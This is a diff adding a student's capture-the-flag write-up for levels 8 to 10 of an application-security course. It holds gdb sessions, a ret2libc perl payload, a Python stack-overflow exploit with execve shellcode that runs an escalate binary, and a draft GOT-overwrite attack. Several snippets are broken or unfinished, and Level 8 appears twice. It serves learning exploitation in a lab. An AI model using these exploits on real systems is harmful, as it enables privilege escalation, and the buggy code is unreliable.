@@ -581,3 +581,691 @@ Permanently added students24 to group level7, congratulations!
 ```
 PS: I wrote down an integer is 8 bytes- obviously it is 4.
 
+# Level 8 
+Root
+```
+students24@appsec2026:/levels/level8$ ls -la
+total 28
+dr-xr-x---  2 root level7  4096 Mar 17 09:49 .
+dr-xr-xr-x 12 root root    4096 Mar 17 09:49 ..
+-r-xr-sr-x  1 root level8 16056 Mar 17 09:49 level8
+-r--r-----  1 root level7   502 Mar 17 09:48 level8.c
+```
+
+Source:
+```
+students24@appsec2026:/levels/level8$ cat level8.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+int main(int argc, char *argv[]){
+        char username[100];
+        printf("What is your name?\n");
+        scanf("%s", username);
+
+        printf("Welcome, %s!\n", username);
+        printf("What do you want to do?\n1)Solve this exercise\n2)Get access to a shell\n");
+        int choice;
+        scanf("%d", &choice);
+        if (choice == 1)
+                printf("Well get on with it then!\n");
+        else if (choice == 2)
+                printf("That would be too easy...\n");
+        else
+                printf("Good luck!\n");
+
+        return 0;
+}
+```
+
+Looking at the source code, this time around, there doesn't seem to be any form of execution or external libraries going on. Therefore, my first intuition would be to use some ROP-type attack affecting the RIP to execute a shell. We see stdlib.h is included, therefore system() should be linked(?)
+
+Opening in gdb
+```
+(gdb) p system
+$1 = {int (const char *)} 0x7ffff7c58750 <__libc_system>
+```
+
+`0x7ffff7c58750` is the address of the system() call.
+
+We are on x86-x64 therefore argument sadly are not stored on the stack, we need a gadget. Furthermore, calling `strings` for /bin/sh
+
+```
+students24@appsec2026:/levels/level8$ strings ./level8 | grep /bin/sh
+....
+``` we can see there are no /bin/sh strings in our binary. Therefore, we need to append this to our payload as well.
+
+Our payload is going to look something like this:
+[buffer] <- 100 characters  ('A')
+[EBP] <--- address to /bin/sh      (begin of buffer)
+[RIP] <--- address to gadget       pop rdi, ret
+
+Buffer begin address: `0x0x7fffffffe1c0`
+We need the gadget address, therefore we search (this in libc):
+```
+(gdb) find /b 0x7ffff7c28000,0x7ffff7db0000, 0x5f, 0xc3
+0x7ffff7d0f78b <__spawnix+875>
+0x7ffff7d10dc9 <parse_qtd_backslash+153>
+0x7ffff7d10fe7 <exec_comm+151>
+0x7ffff7d11cbe <parse_backtick+398>
+0x7ffff7d12559 <parse_dollars+265>
+0x7ffff7d14a19 <parse_arith+489>
+0x7ffff7d157cc <wordexp+2636>
+7 patterns found.
+(gdb) x/2i 0x7ffff7d0f78b
+   0x7ffff7d0f78b <__spawnix+875>:      pop    rdi
+   0x7ffff7d0f78c <__spawnix+876>:      ret
+(gdb) 
+```
+
+Our payload is going to look like this:
+[filler 108 bytes][pop rdi, ret gadget][binsh address (in buffer)][system_address]
+
+(A x 108)(0x7ffff7d0f78b)(0x7fffffffe1c0 + xxxx)(0x7ffff7c58750)
+
+/bin/sh address: 0x7fffffffe1c0 + 108 + 8 + 8 + 8 = 0x7fffffffe244
+Lets generate with perl again
+```
+perl -e 'print "A"x108 . "\x8b\xf7\xd0\xf7\xff\x7f\x00\x00" . "\xe2\xff\xff\xff\x7f\x00\x00" . "\x87\xc5\xf7\xff\x7f\x00\x00'" . "/bin/sh/"'
+```
+
+
+# Level 8 
+Root
+```
+students24@appsec2026:/levels/level8$ ls -la
+total 28
+dr-xr-x---  2 root level7  4096 Mar 17 09:49 .
+dr-xr-xr-x 12 root root    4096 Mar 17 09:49 ..
+-r-xr-sr-x  1 root level8 16056 Mar 17 09:49 level8
+-r--r-----  1 root level7   502 Mar 17 09:48 level8.c
+```
+
+Source:
+```
+students24@appsec2026:/levels/level8$ cat level8.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+int main(int argc, char *argv[]){
+        char username[100];
+        printf("What is your name?\n");
+        scanf("%s", username);
+
+        printf("Welcome, %s!\n", username);
+        printf("What do you want to do?\n1)Solve this exercise\n2)Get access to a shell\n");
+        int choice;
+        scanf("%d", &choice);
+        if (choice == 1)
+                printf("Well get on with it then!\n");
+        else if (choice == 2)
+                printf("That would be too easy...\n");
+        else
+                printf("Good luck!\n");
+
+        return 0;
+}
+```
+
+Looking at the source code, this time around, there doesn't seem to be any form of execution or external libraries going on. Therefore, my first intuition would be to simply inject shellcode to run system('/bin/sh escalate')
+
+Opening in gdb
+```
+(gdb) p system
+$1 = {int (const char *)} 0x7ffff7c58750 <__libc_system>
+``
+
+`0x7ffff7c58750` is the address of the system() call.
+
+We to avoid having a zero string in there, we simply push the payload string byte by byte and allocate it dynamically. After that, we execute the system call and it works!
+
+Then fill the rest up until the return address (0x90) NOP INSTRUCTIONS until the return address.
+
+# Level 9
+
+```
+students24@appsec2026:/levels/level9$ ls -la
+total 28
+dr-xr-x---  2 root level8  4096 Mar 17 09:49 .
+dr-xr-xr-x 12 root root    4096 Mar 17 09:49 ..
+-r-xr-sr-x  1 root level9 16128 Mar 17 09:49 level9
+-r--r-----  1 root level8   898 Mar 17 09:48 level9.c
+students24@appsec2026:/levels/level9$ cat level9.c
+#include <stdio.h>
+
+#define BUFFER_SIZE (32)
+
+void read_input(int* buffer, unsigned short size) {
+    printf("Please enter %d numbers\n", (int)size);
+    for(unsigned short i = 0 ; i < size; ++i) {
+        scanf("%d", &buffer[i]);
+    }
+}
+
+int calc_magic_number(int* buffer, unsigned short num_numbers) {
+    int result = 0;
+    for(unsigned short i = 0; i < num_numbers; ++i)
+        result ^= buffer[i];
+    return result;
+}
+
+int main() {
+    int buffer[BUFFER_SIZE];
+    int num_numbers =  0;
+
+    printf("Welcome to the magic number calculator\nHow many lucky numbers do you have? ");
+    scanf("%d", &num_numbers);
+    
+    if(num_numbers >= BUFFER_SIZE) {
+        printf("Too many numbers\n");
+        return 1;
+    }
+    
+    read_input(buffer, num_numbers);
+    int magic_no = calc_magic_number(buffer, num_numbers);
+    
+    printf("Your magic number is: %d\n", magic_no);
+    return 0;
+}
+```
+
+The assembly:
+```
+000000000000124b <main>:
+    124b:       f3 0f 1e fa             endbr64
+    124f:       55                      push   %rbp
+    1250:       48 89 e5                mov    %rsp,%rbp
+    1253:       48 81 ec a0 00 00 00    sub    $0xa0,%rsp
+    125a:       c7 85 6c ff ff ff 00    movl   $0x0,-0x94(%rbp)
+    1261:       00 00 00 
+    1264:       48 8d 05 bd 0d 00 00    lea    0xdbd(%rip),%rax        # 2028 <_IO_stdin_used+0x28>
+    126b:       48 89 c7                mov    %rax,%rdi
+    126e:       b8 00 00 00 00          mov    $0x0,%eax
+    1273:       e8 08 fe ff ff          call   1080 <printf@plt>
+    1278:       48 8d 85 6c ff ff ff    lea    -0x94(%rbp),%rax
+    127f:       48 89 c6                mov    %rax,%rsi
+    1282:       48 8d 05 98 0d 00 00    lea    0xd98(%rip),%rax        # 2021 <_IO_stdin_used+0x21>
+    1289:       48 89 c7                mov    %rax,%rdi
+    128c:       b8 00 00 00 00          mov    $0x0,%eax
+    1291:       e8 fa fd ff ff          call   1090 <__isoc99_scanf@plt>
+    1296:       8b 85 6c ff ff ff       mov    -0x94(%rbp),%eax
+    129c:       83 f8 1f                cmp    $0x1f,%eax
+    129f:       7e 16                   jle    12b7 <main+0x6c>
+    12a1:       48 8d 05 cc 0d 00 00    lea    0xdcc(%rip),%rax        # 2074 <_IO_stdin_used+0x74>
+    12a8:       48 89 c7                mov    %rax,%rdi
+    12ab:       e8 c0 fd ff ff          call   1070 <puts@plt>
+    12b0:       b8 01 00 00 00          mov    $0x1,%eax
+    12b5:       eb 55                   jmp    130c <main+0xc1>
+    12b7:       8b 85 6c ff ff ff       mov    -0x94(%rbp),%eax
+    12bd:       0f b7 d0                movzwl %ax,%edx
+    12c0:       48 8d 85 70 ff ff ff    lea    -0x90(%rbp),%rax
+    12c7:       89 d6                   mov    %edx,%esi
+    12c9:       48 89 c7                mov    %rax,%rdi
+    12cc:       e8 b8 fe ff ff          call   1189 <read_input>
+    12d1:       8b 85 6c ff ff ff       mov    -0x94(%rbp),%eax
+    12d7:       0f b7 d0                movzwl %ax,%edx
+    12da:       48 8d 85 70 ff ff ff    lea    -0x90(%rbp),%rax
+    12e1:       89 d6                   mov    %edx,%esi
+    12e3:       48 89 c7                mov    %rax,%rdi
+    12e6:       e8 13 ff ff ff          call   11fe <calc_magic_number>
+    12eb:       89 45 fc                mov    %eax,-0x4(%rbp)
+    12ee:       8b 45 fc                mov    -0x4(%rbp),%eax
+    12f1:       89 c6                   mov    %eax,%esi
+    12f3:       48 8d 05 8b 0d 00 00    lea    0xd8b(%rip),%rax        # 2085 <_IO_stdin_used+0x85>
+    12fa:       48 89 c7                mov    %rax,%rdi
+    12fd:       b8 00 00 00 00          mov    $0x0,%eax
+    1302:       e8 79 fd ff ff          call   1080 <printf@plt>
+    1307:       b8 00 00 00 00          mov    $0x0,%eax
+    130c:       c9                      leave
+    130d:       c3                      ret
+```
+
+
+First off all, running the program we are prompted by entering our N of numbers. After which we can deposit n numbers which are promtply stored within the buffer.
+The max size is 32, so to make this program vulnerable, we need to be able to write more than 32 integers, how we will write the payload is a problem for later, but to be able to achieve this, we need to be able to bypass
+```
+if(num_numbers >= BUFFER_SIZE) ...
+```
+
+Whatever number we input as num_numbers, will be passed to this function:
+```
+void read_input(int* buffer, unsigned short size)
+```
+
+we can see size is converted to an unsigned short (16 bit number) which has the range of (0-65535), one way we can make sure we pass the number check whilst still being able to write more than 32 integers would be to: pass a negative number!
+that negative number will be wrapped around (-1 -> 65535), we can try this and we see we actually can:
+```
+students24@appsec2026:/levels/level9$ ./level9
+Welcome to the magic number calculator
+How many lucky numbers do you have? -1
+Please enter 65535 numbers
+```
+
+Now we simply need to write the payload.
+
+```
+0000000000001189 <read_input>:
+    1189:       f3 0f 1e fa             endbr64
+    118d:       55                      push   %rbp
+    118e:       48 89 e5                mov    %rsp,%rbp
+    1191:       48 83 ec 20             sub    $0x20,%rsp <---- 
+    1195:       48 89 7d e8             mov    %rdi,-0x18(%rbp)
+    1199:       89 f0                   mov    %esi,%eax
+    119b:       66 89 45 e4             mov    %ax,-0x1c(%rbp)
+    119f:       0f b7 45 e4             movzwl -0x1c(%rbp),%eax
+    11a3:       89 c6                   mov    %eax,%esi
+    11a5:       48 8d 05 5c 0e 00 00    lea    0xe5c(%rip),%rax        # 2008 <_IO_stdin_used+0x8>
+    11ac:       48 89 c7                mov    %rax,%rdi
+    11af:       b8 00 00 00 00          mov    $0x0,%eax
+    11b4:       e8 c7 fe ff ff          call   1080 <printf@plt>
+    11b9:       66 c7 45 fe 00 00       movw   $0x0,-0x2(%rbp)
+    11bf:       eb 2f                   jmp    11f0 <read_input+0x67>
+    11c1:       0f b7 45 fe             movzwl -0x2(%rbp),%eax
+    11c5:       48 8d 14 85 00 00 00    lea    0x0(,%rax,4),%rdx
+    11cc:       00 
+    11cd:       48 8b 45 e8             mov    -0x18(%rbp),%rax
+    11d1:       48 01 d0                add    %rdx,%rax
+    11d4:       48 89 c6                mov    %rax,%rsi
+    11d7:       48 8d 05 43 0e 00 00    lea    0xe43(%rip),%rax        # 2021 <_IO_stdin_used+0x21>
+    11de:       48 89 c7                mov    %rax,%rdi
+    11e1:       b8 00 00 00 00          mov    $0x0,%eax
+    11e6:       e8 a5 fe ff ff          call   1090 <__isoc99_scanf@plt>
+    11eb:       66 83 45 fe 01          addw   $0x1,-0x2(%rbp)
+    11f0:       0f b7 45 fe             movzwl -0x2(%rbp),%eax
+    11f4:       66 3b 45 e4             cmp    -0x1c(%rbp),%ax
+    11f8:       72 c7                   jb     11c1 <read_input+0x38>
+    11fa:       90                      nop
+    11fb:       90                      nop
+    11fc:       c9                      leave
+    11fd:       c3                      ret
+```
+
+Let's set a breakpoint for read_input's scanf:
+```
+(gdb) break *0x5555555551e6
+Breakpoint 1 at 0x5555555551e6
+(gdb) continue
+Continuing.
+111
+
+Breakpoint 1, 0x00005555555551e6 in read_input ()
+(gdb) info registers
+rax            0x0                 0
+rbx            0x7fffffffe358      140737488347992
+rcx            0x0                 0
+rdx            0x4                 4
+rsi            0x7fffffffe1a4      140737488347556
+rdi            0x555555556021      93824992239649
+rbp            0x7fffffffe180      0x7fffffffe180
+rsp            0x7fffffffe160      0x7fffffffe160
+r8             0xa                 10
+r9             0x0                 0
+r10            0x7ffff7db1fc0      140737351720896
+r11            0x7ffff7e038e0      140737352055008
+r12            0x1                 1
+r13            0x0                 0
+r14            0x555555557db0      93824992247216
+r15            0x7ffff7ffd000      140737354125312
+rip            0x5555555551e6      0x5555555551e6 <read_input+93>
+eflags         0x202               [ IF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+fs_base        0x7ffff7fb2740      1407373
+```
+
+We should find our first buffer entry at $rbp+20
+```
+(gdb) x/d $rbp+0x20
+0x7fffffffe1a0: 111 ....
+```
+Compare this to rbp (0x7fffffffe230):
+```
+>>> hex(0x7fffffffe230 - 0x7fffffffe1a0)
+'0x90'
+```
+So to overwrite rbp+8 we need to write 38 integers. This time, since we're reading integers, we can easily write zero values as well, which will make things
+generally easier. First to write the payload, we will write a helper fnction that converts a byte array into an array of integers so that we can easily input a payload.
+
+```py
+import struct
+def bytes_to_ints(buf):
+    # Pad to align to memory
+    remainder = len(buf) % 8
+    if remainder:
+        buf += b'\x00' * (word_size - remainder)
+    
+    fmt = '<' + ('Q') * (len(buf) // word_size)
+    return list(struct.unpack(fmt, buf))
+```
+
+So now all we need to do is construct a payload. We can simply call system() with /bin/sh
+```
+(gdb) p system
+$1 = {int (const char *)} 0x7ffff7c58750 <__libc_system>
+```
+Now we need to find the /bin/sh pointer (0x7ffff7dcb42f)
+
+```
+(gdb) find 0x7ffff7c28000,+300000000, "/bin/sh"
+0x7ffff7dcb42f
+```
+
+Some addresses to keep track of:
+return address in main: 0x000055555555530d
+buffer base: 0x7fffffffe1a0
+execv:0x7ffff7ceef10
+sh addy: 0x7ffff7dcb42f
+exit() : 0x7ffff7c47ba0
+
+without gdb env thing:
+x/32d 0x7fffffffe1e0
+
+```
+0x7fffffffe1bc: 11      11      22      33
+0x7fffffffe1cc: 44      2097152 0       2097152
+0x7fffffffe1dc: 0       32768   0       -7656
+0x7fffffffe1ec: 32767   6       42      0
+0x7fffffffe1fc: 0       0       0       0
+0x7fffffffe20c: 0       0       0       0
+0x7fffffffe21c: 0       0       0       0
+0x7fffffffe22c: 0       0       0       -134325520
+```
+
+
+Now we can attempt to open a shell. Writing the payload:
+```py
+
+import sys
+import struct
+
+print('-65433') #this allows us to write a number of bytes
+ 
+def create_shellcode_absolute(str_addy):
+    """Create shellcode with absolute address of string"""
+    # Convert address to little-endian bytes
+    addr_bytes = str_addy.to_bytes(8, byteorder='little')
+
+    shellcode = (
+        b"\x48\x31\xf6"              # xor rsi, rsi  (argv = NULL)
+        b"\x48\x31\xd2"              # xor rdx, rdx  (envp = NULL)
+        b"\x48\xbf" + addr_bytes +   # mov rdi, str_addy  <-- direct pointer
+        b"\x48\x31\xc0"              # xor rax, rax
+        b"\xb0\x3b"                  # mov al, 0x3b (execve)
+        b"\x0f\x05"                  # syscall
+    )
+    return shellcode
+
+# Offset to return address (144 bytes to rbp + 8)
+offset = 152
+
+# Buffer base address (from your GDB: 0x7fffffffe1a0)
+buffer_base = 0x7fffffffe1e0 #adjusted for GDB environment stack replacement
+size_shell = len(create_shellcode_absolute(0x7fffffffe1a0))
+
+# Build payload: NOP sled + shellcode + padding + return address
+nop_sled = b'\x90' * 50 # for this purpose a nop sled is not actually necessary, but w/e
+payload = nop_sled + create_shellcode_absolute(buffer_base + len(nop_sled) + size_shell)
+payload += b'/usr/local/bin/escalate\x00'
+payload += b'A' * (offset - len(payload))
+payload += struct.pack('<Q', buffer_base)  # Jump to buffer start
+
+# Convert to 32-bit integers for scanf("%d")
+for i in range(0, len(payload), 4):
+    chunk = payload[i:i+4]
+    if len(chunk) < 4:
+        chunk = chunk + b'\x00' * (4 - len(chunk))
+    val = struct.unpack('<i', chunk)[0]
+    print(val)
+
+```
+
+# Level 10
+students24@appsec2026:/levels/level10$ ls -la
+dr-xr-x---  2 root level9   4096 Mar 17 09:49 .
+dr-xr-xr-x 12 root root     4096 Mar 17 09:49 ..
+-r-xr-sr-x  1 root level10 16888 Mar 17 09:49 level10
+-r--r-----  1 root level9   4326 Mar 17 09:48 level10.c
+-r--r-----  1 root level9    661 Mar 17 09:48 memory_cells.h
+
+```c
+students24@appsec2026:/levels/level10$ cat memory_cells.h
+#ifndef __MEMORY_CELLS_H__
+#define __MEMORY_CELLS_H__
+
+typedef enum MemoryType {
+    TYPE_NONE,
+    TYPE_INT,
+    TYPE_FLOAT,
+    TYPE_STRING
+} MemoryType;
+
+typedef struct __attribute__((packed)) Memory {
+    MemoryType type;
+    char padding[16];
+} Memory;
+
+typedef struct __attribute__((packed)) MemoryInt {
+    MemoryType type;
+    long long value;
+    char padding[8];
+} MemoryInt;
+
+typedef struct __attribute__((packed)) MemoryFloat {
+    MemoryType type;
+    double value;
+    char padding[8];
+} MemoryFloat;
+
+typedef struct __attribute__((packed)) MemoryString {
+    MemoryType type;
+    char* location;
+    size_t location_size;
+} MemoryString;
+#endif
+```
+
+```c
+students24@appsec2026:/levels/level10$ cat level10.c
+#include <stdio.h>
+#include <stddef.h>
+#include <string.h>
+#include <stdlib.h>
+
+#include "memory_cells.h"
+
+#define MAX_MEMORY (128)
+
+Memory memory[MAX_MEMORY];
+
+void set_int(MemoryInt* mem, long long value) {
+    mem->value = value;
+}
+
+void set_float(MemoryFloat* mem, double value) {
+    mem->value = value;
+}
+
+void set_string(MemoryString* mem, const char* value) {
+    if(mem->type != TYPE_STRING)
+        return;
+
+    size_t value_size = strlen(value);
+    if(value_size > 0 && value[value_size-1] == '\n')
+        --value_size;
+    
+    if(value_size != mem->location_size) {
+        free(mem->location);
+        mem->location = malloc(value_size);
+        mem->location_size = value_size;
+    }
+    
+    memcpy(mem->location, value, value_size);
+};
+
+void handle_allocate(const char* args) {
+    int slot, type;
+    if(sscanf(args, "%d %d", &slot, &type) < 2)
+        return;
+    if(slot < 0 || slot >= MAX_MEMORY)
+        return;
+        
+    if(memory[slot].type == TYPE_STRING) {
+        free(((MemoryString*)&memory[slot])->location);
+    }
+    
+    if(type == TYPE_INT) {
+        MemoryInt* val = (MemoryInt*)(&memory[slot]);
+        val->type = TYPE_INT;
+        val->value = 0.0;
+    }
+    if(type == TYPE_FLOAT) {
+        MemoryFloat* val = (MemoryFloat*)(&memory[slot]);
+        val->type = TYPE_FLOAT;
+        val->value = 0;
+    }
+    if(type == TYPE_STRING) {
+        MemoryString* val = (MemoryString*)(&memory[slot]);
+        val->type = TYPE_STRING;
+        val->location = NULL;
+        val->location_size = 0;
+    }
+}
+
+void handle_setint(const char* args) {
+    int slot;
+    long long arg;
+    if(sscanf(args, "%d %lld", &slot, &arg) < 2)
+        return;
+    
+    if(slot >= 0 && slot < MAX_MEMORY)
+        set_int((MemoryInt*)&memory[slot], arg);
+}
+
+void handle_setfloat(const char* args) {
+    int slot;
+    double arg;
+    if(sscanf(args, "%d %lf", &slot, &arg) < 2)
+        return;
+    
+    if(slot >= 0 && slot < MAX_MEMORY)
+        set_float((MemoryFloat*)&memory[slot], arg);
+}
+
+void handle_setstring(const char* args) {
+    size_t end_idx = 0;
+    while(args[end_idx] != '\0' && args[end_idx] != ' ') {
+        ++end_idx;
+    }
+    
+    if(args[end_idx] == '\0')
+        return;
+    
+    int slot;
+    if(sscanf(args, "%d", &slot) < 1)
+        return;
+    
+    if(slot >= 0 && slot < MAX_MEMORY)
+        set_string((MemoryString*)&memory[slot], &args[end_idx+1]);
+}
+
+void handle_print(const char* args) {
+    int slot;
+    if(sscanf(args, "%d", &slot) < 1)
+        return;
+    if(slot < 0 || slot >= MAX_MEMORY)
+        return;
+    
+    printf("Slot type: %d\n", (int)memory[slot].type);
+    if(memory[slot].type == TYPE_INT)
+        printf("Slot value: %lld\n", ((MemoryInt*)&memory[slot])->value);
+    if(memory[slot].type == TYPE_FLOAT)
+        printf("Slot value: %lf\n", ((MemoryFloat*)&memory[slot])->value);
+    if(memory[slot].type == TYPE_STRING) {
+        printf("Slot value: ");
+        MemoryString* str = (MemoryString*)&memory[slot];
+        fwrite(str->location, 1, str->location_size, stdout);
+        fflush(stdout);
+        printf("\n");
+    }
+}
+
+void handle_line(const char* line) {
+    size_t substr_idx = 0;
+    while(line[substr_idx] != '\0' && line[substr_idx] != ' ') {
+        ++substr_idx;
+    }
+    if(line[substr_idx] == '\0')
+        return;
+    ++substr_idx;
+    
+    if(strncmp(line, "allocate", 8) == 0)
+        handle_allocate(&line[substr_idx]);
+    if(strncmp(line, "setint", 6) == 0)
+        handle_setint(&line[substr_idx]);
+    if(strncmp(line, "setfloat", 8) == 0)
+        handle_setfloat(&line[substr_idx]);
+    if(strncmp(line, "setstring", 9) == 0)
+        handle_setstring(&line[substr_idx]);
+    if(strncmp(line, "print", 5) == 0)
+        handle_print(&line[substr_idx]);
+}
+
+int main() {
+    puts("Welcome to the note storage system");
+    puts("Valid commands are:");
+    puts("    allocate <int> <int>");
+    puts("    setint <int> <int>");
+    puts("    setfloat <int> <float>");
+    puts("    setstring <int> <string>");
+    puts("    print <int>");
+    
+    for(size_t i = 0; i < MAX_MEMORY; ++i) {
+        memory[i].type = TYPE_NONE;
+    }
+    
+    char* line = NULL;
+    size_t n = 0;
+    while(getline(&line, &n, stdin) != -1) {
+        handle_line(line);
+        
+        free(line);
+        line = NULL;
+        n = 0;
+    }
+    return 0;
+}
+```
+
+The approach here is to use the memory read and write associated with the string methods (and the non-existent type checking) to leverage reading and executing unwanted memory.
+Running it in gdb with the COLUMNS, LINES and TERM environment variables unset (to avoid wrong stack alignment):
+
+System address: 0x7ffff7c58750
+
+We can further leverage this by overwriting the pointers of the functions associated with the strings free. Get the GOT entry of free
+
+```
+students24@appsec2026:/levels/level10$ objdump -R ./level10 | grep free
+0000000000003f78 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5
+```
+
+We can write the payload as such:
+
+```py
+import struct, sys
+
+FREE_GOT = 0x3f78 
+SYSTEM   = 0x7f ff f7c58750
+ESCALATE = '/usr/local/bin/escalate'
+
+payload = "allocate 0 3\n"
+
+sys.stdout.buffer.write(payload)
+```
